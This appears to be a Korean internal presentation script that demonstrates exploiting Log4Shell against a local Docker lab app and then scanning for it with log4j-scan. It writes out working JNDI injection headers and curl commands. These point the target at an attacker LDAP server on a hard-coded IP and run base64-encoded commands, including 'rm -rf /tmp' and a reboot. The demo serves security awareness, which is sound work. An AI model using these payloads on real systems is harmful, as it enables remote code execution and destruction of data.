# log4j 공격 시연 시나리오 및 스캔 시연

> 사내 연말 Log4j 취약점 이슈 발표용 시연 시나리오

## 서버 세팅

### 1. 취약 서버(1번탭)

```bash
docker start vulnerable-app
docker logs -f vulnerable-app
```

![1](https://raw.githubusercontent.com/Shane-Park/mdblog/main/presentation/log4shell.assets/1.png)

> 새로운 탭 `Ctrl+Shift+T`
>
> 2번탭:  `docker exec -it vulnerable-app ls -al /tmp` 해서 tmp 폴더 상태 띄워두기

![2](https://raw.githubusercontent.com/Shane-Park/mdblog/main/presentation/log4shell.assets/2.png)

### 2. 공격 서버

> 3번 탭 새로 하나 띄우고 `Ctrl+Shift+T`

```bash
ssh cloud
java -jar /shane/attack.jar -i 146.56.44.96 -p 8888
```

![3](https://raw.githubusercontent.com/Shane-Park/mdblog/main/presentation/log4shell.assets/3.png)

### 3. Postman 실행

> Postman 크기를 적당히 조정해서 1번 tab의 로그가 갱신될 때 확인 가능하도록 해둠. Terminal Tab을 1번으로 돌려둠.

## 공격

> Postman에 요청

### Log4J가 JNDI LookUp을 하고 있는지 확인

```bash
GET: localhost:9999
Header Key: X-Api-Version
Header Value: ${jndi:java:version}
```

![4](https://raw.githubusercontent.com/Shane-Park/mdblog/main/presentation/log4shell.assets/4.png)

> javq 버전 올라오는 것 확인 후, Tab을 공격 서버로 변경 (3번탭)

### LDAP 서버로 요청을 보내는지 확인

```bash
GET: localhost:9999
Header Key: X-Api-Version
Header Value: ${jndi:ldap://146.56.44.96:1389/argonet}
```

> Postman 사용불가능할 경우 Terminal에서 curl로 요청
>
> ```bash
> curl 127.0.0.1:9999 -H 'X-Api-Version: ${jndi:ldap://146.56.44.96:1389/argonet}'
> ```

![5](https://raw.githubusercontent.com/Shane-Park/mdblog/main/presentation/log4shell.assets/5.png)

- 공격 쿼리 전송

> 3번 tab에서 LDAP 요청 온것 확인 후, 1번탭에서 look up 한것 확인 후 다시 3번 탭 띄워둠.

### 쿼리로 보낼 커맨드 Base64로 인코딩

```bash
echo -n 'touch /tmp/argonet.december-table' | base64
```

![6](https://raw.githubusercontent.com/Shane-Park/mdblog/main/presentation/log4shell.assets/6.png)

### 취약 서버에 명령어 전송

```bash
PostMan으로 헤더에 X-Api-Version value 넣어서 요청 혹은 curl로 요청
curl 127.0.0.1:9 -H 'X-Api-Version: ${jndi:ldap://146.56.44.96:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9hcmdvbmV0LmRlY2VtYmVyLXRhYmxl}'
```

![7](https://raw.githubusercontent.com/Shane-Park/mdblog/main/presentation/log4shell.assets/7.png)

> Payload에 `touch /tmp/agronet.december-table` 이라는 커맨드를 담아 요청 한 것을 확인.

### 취약서버 공격 당한 흔적 확인

> 2번 Tab을 열어 같은 명령어를 그대로 쳐서 새로운 파일이 들어온 것을 확인

![8](https://raw.githubusercontent.com/Shane-Park/mdblog/main/presentation/log4shell.assets/8.png)

> 백도어가 간단하게 심어진다는 것을 설명. 파일 생성시간을 확인 시켜준다.

UTC 시간을 확인시켜 준다.

```bash
date -u
```

![9](https://raw.githubusercontent.com/Shane-Park/mdblog/main/presentation/log4shell.assets/9.png)

폴더 삭제 시연

> 다시 공격 서버로 탭 3번 올려둠.

명령어 만들기 위해 새로운 창의 Terminal에서 tmp 폴더 삭제 명령어 인코딩 후 공격 코드 전송

```bash
echo -n 'rm -rf /tmp' | base64
```

![10](https://raw.githubusercontent.com/Shane-Park/mdblog/main/presentation/log4shell.assets/10.png)

이후 두번째 탭에서 파일 삭제 된 것 확인

![11](https://raw.githubusercontent.com/Shane-Park/mdblog/main/presentation/log4shell.assets/11.png)

### reboot 명령까지 전송

> 3번탭에서 reboot 명령어 전송 된 것 확인 후 docker 컨테이너 종료 된 것 확인

![12](https://raw.githubusercontent.com/Shane-Park/mdblog/main/presentation/log4shell.assets/12.png)

<br><br>

공격 시연 끝 다시 발표로 돌아가기

## log4j scan 시연

일단 vulnerable-app 다시 실행 해 준다.

```bash
docker start vulnerable-app
```

> 혹시 tmp 폴더를 지워버렸으면 docker 컨테이너가 실행이 안되니 /tmp 폴더를 생성 해줘야함
>
> 안그러면 서버가 계속 죽는다.
>
> ```bash
> mkdir tmp
> docker cp ./tmp vulnerable-app:/
> docker start vulnerable-app
> ```

`docker logs -f vulnerable-app ` 해서 서버 잘 뜬거 확인 후

```bash
git clone git@github.com:fullhunt/log4j-scan.git
```

```
cd log4j-scan
ls
pip3 install -r requirements.txt
python3 log4j-scan.py -u "http://gaia.best"
```

![13](https://raw.githubusercontent.com/Shane-Park/mdblog/main/presentation/log4shell.assets/13.png)

이번에는 취약 서버 확인

```bash
python3 log4j-scan.py -u "http://localhost:9999"
```

![14](https://raw.githubusercontent.com/Shane-Park/mdblog/main/presentation/log4shell.assets/14.png)

Targets Affected 확인.

<br><br>

취약점 스캔 시연 끝. 발표로 돌아가기